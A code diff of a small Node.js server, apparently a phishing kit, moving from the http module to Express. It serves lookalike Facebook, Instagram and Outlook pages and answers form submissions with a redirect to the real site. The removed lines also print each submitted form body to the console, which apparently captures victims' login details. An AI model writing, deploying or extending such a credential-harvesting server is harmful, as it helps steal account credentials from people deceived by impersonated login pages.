@@ -1,66 +1,59 @@
-const http = require('http');
-const fs = require('fs').promises;
+const express = require('express');
 const path = require('path');
+const fs = require('fs').promises;
+
+const app = express();
 const PORT = 8080;
-const BASE_PATH = path.join(__dirname, 'public')
+const BASE_PATH = path.join(__dirname, 'public');
 
-const server = http.createServer(async (req, res) => {
-    let url = req.url;
-    if(req.url == "" || req.url == "/") {
-        url = "facebook.html";
+// Middleware to parse the request body for POST requests
+app.use('/static', express.static('public'))
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+
+// Route for serving the root
+app.get('/', async (req, res) => {
+    try {
+        const file = await fs.readFile(path.join(BASE_PATH, 'facebook.html'));
+        res.send(file.toString());
+    } catch (err) {
+        const errorFile = await fs.readFile(path.join(BASE_PATH, '404.html'));
+        res.status(404).send(errorFile.toString());
+    }
+});
+
+// Dynamic route to serve specific files (facebook, instagram, outlook)
+app.get('/:platform', async (req, res) => {
+    let platform = req.params.platform;
+
+    if (platform === 'facebook') {
+        platform = 'facebook.html';
+    } else if (platform === 'instagram') {
+        platform = 'instagram.html';
+    } else if (platform === 'outlook') {
+        platform = 'outlook.html';
     }
 
-     switch(req.method) {
-    case "GET":
-        GET(url, req, res);
-        break;
-    case "POST":
-        POST(url, req, res)
-        break;
- }
-})
-
-
- async function GET(url, req, res) {
-      if (url === '/facebook') {
-        url = 'facebook.html';
-    } else if (url === '/instagram') {
-        url = '/instagram.html';
-    } else if (url === '/outlook') {
-        url = '/outlook.html';
-    }
-
-
-    const filePath = path.join(BASE_PATH, url)
+    const filePath = path.join(BASE_PATH, platform);
 
     try {
         const file = await fs.readFile(filePath);
-        res.write(file);
+        res.send(file.toString());
     } catch (err) {
         const errorFile = await fs.readFile(path.join(BASE_PATH, '404.html'));
-        res.write(errorFile);
+        res.status(404).send(errorFile.toString());
     }
-    finally {
-        res.end();
-    }
- }
+});
 
- async function POST (url , req, res) {
-    var body = '';
-    req.on('data', chunk => {
-        body += chunk;
-    });
-    req.on('end', async () => {
-        let urlresult = url.replace('/', '').replace('.html', '');
-        console.log(body);
+// POST route to handle redirection based on the platform
+app.post('/:platform', (req, res) => {
+    let platform = req.params.platform;
+    let redirectUrl = `https://www.${platform}.com`;
 
-        res.statusCode = 302;
+    res.redirect(302, redirectUrl);
+});
 
-        res.setHeader('Location', `https://www.${urlresult}.com`); 
-
-        res.end();
-
-    })
- }
-
-server.listen(PORT);
+// Start the server
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
